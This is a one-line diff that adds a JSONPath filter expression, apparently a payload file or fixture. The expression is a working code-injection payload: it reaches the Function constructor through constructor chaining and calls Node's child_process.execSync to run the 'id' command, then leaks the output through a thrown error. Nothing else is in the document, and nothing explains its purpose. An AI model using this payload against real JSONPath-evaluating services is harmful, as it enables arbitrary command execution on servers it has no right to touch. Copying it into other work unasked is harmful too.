@@ -1,0 +1,1 @@
+$..[?(p="throw Error(this.process.mainModule.require('child_process').execSync('id').toString())";a=''[['constructor']][['constructor']](p);a())]
